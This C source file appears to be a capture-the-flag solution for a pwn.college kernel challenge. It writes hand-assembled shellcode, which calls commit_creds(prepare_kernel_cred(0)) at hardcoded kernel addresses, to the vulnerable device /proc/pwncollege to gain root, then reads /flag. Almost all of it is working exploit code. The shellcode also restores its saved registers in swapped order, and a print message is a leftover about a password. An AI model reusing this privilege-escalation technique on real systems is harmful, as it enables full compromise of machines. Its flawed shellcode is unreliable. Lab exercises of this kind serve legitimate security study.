/*
device_write to input shellcode to privillege escalation
shellcode: commit_creds(prepare_kernel_cred(0));
exp:
1. login in as practice mode, vm connect and sudo su to cat /proc/kallsyms, find the commit_creds and prepare_kernel_cred address
2. write the shellcode and assembly it and send to device /proc/pwncollege
*/
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

const char DEVICE_PATH[] = "/proc/pwncollege";
const unsigned long prepare_kernel_cred_addr = 0xffffffff81089660;
const unsigned long commit_creds_addr = 0xffffffff81089310;

/*
push rdi;
push rsi;
xor rdi, rdi;
mov rsi, 0xffffffff81089660;
call rsi; call prepare_kernel_cred(0)
mov rdi, rax; result of prepare_kernel_cred(0)
mov rsi, 0xffffffff81089310;
call rsi;
pop rdi;
pop rsi;
ret;
*/
const char shellcode[] = "\x57\x56\x48\x31\xff\x48\xc7\xc6\x60\x96\x08\x81\xff\xd6\x48\x89\xc7\x48\xc7\xc6\x10\x93\x08\x81\xff\xd6\x5f\x5e\xc3";

int main() {
    int fd = open(DEVICE_PATH, O_WRONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    ssize_t written_size = write(fd, shellcode, strlen(shellcode));
    printf("password written to device successfully.\n");
    system("cat /flag");
    close(fd);
    return 0;
}
